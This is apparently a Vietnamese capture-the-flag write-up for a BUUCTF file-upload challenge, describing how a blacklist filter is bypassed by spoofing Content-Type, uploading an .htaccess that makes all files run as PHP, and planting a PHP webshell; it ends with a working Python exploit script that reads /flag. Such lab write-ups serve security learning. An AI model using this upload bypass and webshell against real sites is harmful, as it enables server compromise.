![image](https://github.com/Llam-a/BUUCTF/assets/115911041/53f2aaf2-cac8-426a-a3b6-4b4c3ff8426a)

Thử upload Trojan rồi dùng burpsuite để bắt package.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/fb908882-c036-4607-bdb6-b45264deeb2a)

Kết quả là bị filter đi rôi, mình sẽ thử nhưng cách thông thường mình hay làm - mình sẽ thử đổi Content-Type thành `image/jpeg`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/09e2446f-67f8-4e3a-9330-33af7b4d8b0c)

Vẫn bị filter nhưng lần này ra kết quả khác.Mình thử đổi extension file thành `.abc` để xem bài này thuộc dạng blacklist hay ko

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/b7c37e4c-9fd4-4dec-a2ca-e04302a3898c)

Kết quả vẫn trả về như lúc nãy,nên bài này có blacklist filter.Bây giờ mình sẽ ghi đè qua việc upload file `.htacccess`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/1b311df2-3cef-44d9-b18b-6eb9e47d8345)

Upload thành công,bây giờ các file có đuôi là hack sẽ được execute dưới dạng php.Bây giờ chỉ cần upload file Trojan rồi sau đó dùng antsword để đọc flag thôi

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/431bb1f2-dbc1-437c-b064-f64aebf2b2f4)


![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f7024129-6a42-4721-befb-b8e76cae9072)

```solve.py
import requests
url = "http://eb860b1b-3bd1-47a3-8087-45e2cfda262c.node5.buuoj.cn:81/"
session = requests.session()
htaccess = {'uploaded': ('.htaccess', "SetHandler application/x-httpd-php", 'image/jpeg')}
res_hta = session.post(url, files=htaccess)

files = {'uploaded': ('123.jpg', "<script language=\"php\">echo file_get_contents(\"/flag\");</script>", 'image/jpeg')}
res_jpg = session.post(url, files=files)

res_shell = session.post(url + res_jpg.text[-69:-22], data = {'a':'echo file_get_contents(\'/flag\');'})

print(res_shell.text)
```
